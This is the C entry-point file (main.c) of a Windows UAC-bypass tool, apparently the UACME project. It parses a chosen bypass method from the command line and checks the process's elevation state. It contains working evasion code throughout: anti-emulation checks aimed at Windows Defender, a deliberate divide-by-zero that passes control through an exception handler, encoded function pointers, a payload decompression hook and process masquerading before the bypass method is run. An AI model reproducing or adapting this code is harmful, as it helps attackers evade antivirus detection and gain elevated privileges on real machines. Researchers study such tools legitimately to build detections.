/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2021
*
*  TITLE:       MAIN.C
*
*  VERSION:     3.56
*
*  DATE:        17 July 2021
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#pragma comment(lib, "comctl32.lib")

//Runtime context global variable
PUACMECONTEXT g_ctx;

//Image Base Address global variable
HINSTANCE g_hInstance;

TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "<??>" };

/*
* ucmDummyWindowProc
*
* Purpose:
*
* Part of antiemulation, does nothing.
*
*/
LRESULT CALLBACK ucmDummyWindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam
)
{
    switch (uMsg) {
    case WM_SHOWWINDOW:
        SendMessage(hwnd, WM_CLOSE, 0, 0);
        break;
    case WM_CLOSE:
        PostQuitMessage(0);
        break;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit(
    _Inout_ UCM_METHOD *RunMethod,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    UCM_METHOD  Method;
    NTSTATUS    Result = STATUS_SUCCESS;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;
    MSG         msg1;
    WNDCLASSEX  wincls;
    BOOL        rv = 1;
    HWND        TempWindow;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR WndClassName[] = TEXT("reyortseD");
    WCHAR WndTitleName[] = TEXT("ikibiH");


    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        if (*RunMethod == UacMethodInvalid) {

            bytesIO = 0;
            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
            GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO == 0)
                return STATUS_INVALID_PARAMETER;

            Method = (UCM_METHOD)_strtoul(szBuffer);
            *RunMethod = Method;

        }
        else {
            Method = *RunMethod;
        }

#ifndef _DEBUG
        if (Method == UacMethodTest)
            return STATUS_INVALID_PARAMETER;
#endif
        if (Method >= UacMethodMax)
            return STATUS_INVALID_PARAMETER;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }
#endif

        //
        // Process optional parameter.
        //
        if ((OptionalParameter == NULL) || (OptionalParameterLength == 0)) {

            RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
            bytesIO = 0;
            GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
            if (bytesIO > 0) {
                optionalParameter = (LPWSTR)&szBuffer;
                optionalParameterLength = bytesIO;
            }

        }
        else {
            optionalParameter = OptionalParameter;
            optionalParameterLength = OptionalParameterLength;
        }

        wincls.cbSize = sizeof(WNDCLASSEX);
        wincls.style = CS_OWNDC;
        wincls.lpfnWndProc = &ucmDummyWindowProc;
        wincls.cbClsExtra = 0;
        wincls.cbWndExtra = 0;
        wincls.hInstance = g_hInstance;
        wincls.hIcon = NULL;
        wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
        wincls.hbrBackground = NULL;
        wincls.lpszMenuName = NULL;
        wincls.lpszClassName = WndClassName;
        wincls.hIconSm = 0;

        RegisterClassEx(&wincls);

        TempWindow = CreateWindowEx(WS_EX_TOPMOST, 
            WndClassName,
            WndTitleName,
            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 
            0, 0, 
            32, 
            32, 
            NULL, NULL, 
            g_hInstance, 
            NULL);

        if (TempWindow)
            return STATUS_FATAL_APP_EXIT;

        do {
            rv = GetMessage(&msg1, NULL, 0, 0);

            if (rv == -1) {
                return STATUS_FATAL_APP_EXIT;
            }

            TranslateMessage(&msg1);
            DispatchMessage(&msg1);

        } while (rv != 0);

        UnregisterClass(WndClassName, g_hInstance);

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(Method,
            optionalParameter,
            optionalParameterLength,
            supEncodePointer(DecompressPayload),
            OutputToDebugger);


    } while (FALSE);

    if (g_ctx == NULL)
        Result = STATUS_FATAL_APP_EXIT;

    return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
NTSTATUS WINAPI ucmMain(
    _In_opt_ UCM_METHOD Method,
    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
    _In_opt_ ULONG OptionalParameterLength,
    _In_ BOOL OutputToDebugger
)
{
    NTSTATUS    Status;
    UCM_METHOD  method = Method;

    wdCheckEmulatedVFS();

    Status = ucmInit(&method,
        OptionalParameter,
        OptionalParameterLength,
        OutputToDebugger);

    switch (Status) {

    case STATUS_ELEVATION_REQUIRED:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_UAC_REQUIRED);
        break;

    case STATUS_NOT_SUPPORTED:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_ADMIN_REQUIRED);
        break;

    case STATUS_INVALID_PARAMETER:
        ucmShowMessageById(OutputToDebugger, IDSB_USAGE_HELP);
        break;

    case STATUS_FATAL_APP_EXIT:
        return Status;
        break;

    default:
        break;

    }

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);

    return MethodsManagerCall(method);
}

/*
* ucmSehHandler
*
* Purpose:
*
* Program entry point seh handler, indirect control passing.
*
*/
INT ucmSehHandler(
    _In_ UINT ExceptionCode,
    _In_ EXCEPTION_POINTERS *ExceptionInfo
)
{
    UACME_THREAD_CONTEXT *uctx;

    UNREFERENCED_PARAMETER(ExceptionInfo);

    if (ExceptionCode == STATUS_INTEGER_DIVIDE_BY_ZERO) {
        uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
        while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
            uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
        }
        if (uctx) {
            if (uctx->ucmMain) {
                uctx->ucmMain = (pfnEntryPoint)supDecodePointer(uctx->ucmMain);
                
                uctx->ReturnedResult = uctx->ucmMain(UacMethodInvalid, 
                    NULL, 
                    0, 
                    FALSE);
            }
        }
        return EXCEPTION_EXECUTE_HANDLER;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

#ifndef KUMA_STUB

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
#pragma comment(linker, "/ENTRY:main")
VOID __cdecl main()
{
    int v = 1, d = 0;
    UACME_THREAD_CONTEXT uctx;

    RtlSecureZeroMemory(&uctx, sizeof(uctx));

    if (wdIsEmulatorPresent() == STATUS_NOT_SUPPORTED) {

        uctx.Frame.Context = &g_fctx;
        uctx.ucmMain = (pfnEntryPoint)supEncodePointer(ucmMain);
        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);

        __try {
            v = (int)USER_SHARED_DATA->NtProductType;
            d = (int)USER_SHARED_DATA->AlternativeArchitecture;
            v = (int)(v / d);
        }
        __except (ucmSehHandler(GetExceptionCode(), GetExceptionInformation())) {
            v = 1;
        }

        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
    }
    if (v > 0)
        ExitProcess(uctx.ReturnedResult);
}

#endif
